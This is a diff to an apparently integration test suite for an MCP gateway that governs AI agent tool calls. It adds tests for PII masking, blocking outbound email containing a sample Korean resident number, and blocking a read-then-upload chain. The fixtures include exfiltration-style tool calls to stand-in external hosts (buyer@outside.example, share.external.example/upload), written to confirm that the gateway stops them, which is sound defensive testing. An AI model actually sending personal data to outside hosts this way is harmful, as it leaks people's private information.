@@ -7,7 +7,9 @@ This covers the Gateway's own guarantees around that: the MCP ingress refuses an
 unauthenticated client the way the MCP authorization spec says, tools are listed
 per role, unapproved and unknown tools never run, arguments are checked against
 the approved schema, a drifted contract blocks, approval runs a call exactly once,
-monitor mode records what enforcement would have done, and the audit chain holds.
+monitor mode records what enforcement would have done, detected identifiers are
+masked in results and never sent outside, a read of important data followed by an
+external send is stopped as a chain, and the audit chain holds.
 
 Every call goes through the real ingress (/mcp/) with a real token to a real
 server. A server someone has put into termination is not restored here - the test
@@ -18,6 +20,7 @@ from __future__ import annotations
 import asyncio
 import json
 import os
+import re
 import sys
 
 import httpx
@@ -200,6 +203,45 @@ async def monitor_mode_records() -> str:
     return "관찰 모드: 실행 + would_decision=Block → 복귀 후 Block"
 
 
+RRN = re.compile(r"\b\d{6}-[1-4]\d{6}\b")
+
+
+async def pii_masked_in_output() -> str:
+    """PDF 8~10쪽: detected identifiers do not leave the Gateway in a tool result."""
+    await operating("postgres")
+    out = await call("employee", "postgres__execute_sql",
+                     {"sql": "SELECT name, phone, rrn, email FROM sales.customers ORDER BY id LIMIT 2"})
+    expect(out.get("decision") in {"Allow", "Alert"} and not out["is_error"],
+           f"고객 원장 조회: {out.get('decision')} {out.get('policy_id')} {out['text'][:120]}")
+    expect("[REDACTED]" in out["text"] and not RRN.search(out["text"]) and "010-" not in out["text"],
+           f"마스킹되지 않은 결과: {out['text'][:200]}")
+    row = await db.fetch_one("SELECT privacy_types, risk_score FROM decisions WHERE id=%s", (out.get("decision_id"),))
+    expect(row and "KR_RRN" in row["privacy_types"], f"감사 행의 개인정보 유형: {row}")
+    return f"{out['policy_id']} · 출력 마스킹 {', '.join(row['privacy_types'])} · 위험 {row['risk_score']}"
+
+
+async def pii_external_send_blocked() -> str:
+    await operating("email")
+    out = await call("employee", "email__send_email", {
+        "account_name": "assistant", "recipients": ["buyer@outside.example"],
+        "subject": "고객 명단", "body": "홍길동 900101-1234567, 010-1234-5678"})
+    expect(out.get("decision") == "Block" and out.get("policy_id") == "MCP-DATA-EGRESS-001",
+           f"개인정보 외부 발송: {out.get('decision')} {out.get('policy_id')}")
+    row = await db.fetch_one("SELECT upstream_attempted, privacy_types FROM decisions WHERE id=%s",
+                             (out.get("decision_id"),))
+    expect(row and not row["upstream_attempted"] and "KR_RRN" in row["privacy_types"], f"기록: {row}")
+    return f"MCP-DATA-EGRESS-001 · 탐지 {', '.join(row['privacy_types'])} · 미전송"
+
+
+async def read_then_send_chain_blocked() -> str:
+    """Runs after pii_masked_in_output: the same principal read important data minutes ago."""
+    await operating("fetch")
+    out = await call("employee", "fetch__fetch", {"url": "https://share.external.example/upload?d=1"})
+    expect(out.get("decision") == "Block" and out.get("policy_id") == "P-CHAIN-001",
+           f"열람 뒤 외부 전송: {out.get('decision')} {out.get('policy_id')}")
+    return "P-CHAIN-001"
+
+
 async def audit_chain_intact() -> str:
     result = await verify_audit_chain()
     expect(result["intact"], f"감사 체인 손상: {result}")
@@ -218,6 +260,11 @@ async def run() -> dict:
         ("drifted-contract-blocks", drifted_contract_blocks()),
         ("approval-runs-exactly-once", approval_runs_once()),
         ("monitor-mode-records-would-decision", monitor_mode_records()),
+        # PDF integration (Presidio, MCP-DATA-EGRESS-001, P-CHAIN-001) - order matters:
+        # the chain check relies on the important read made by the first one.
+        ("pii-masked-in-output", pii_masked_in_output()),
+        ("pii-external-send-blocked", pii_external_send_blocked()),
+        ("read-then-send-chain-blocked", read_then_send_chain_blocked()),
         ("audit-chain-intact", audit_chain_intact()),
     ]:
         await check(name, coro)
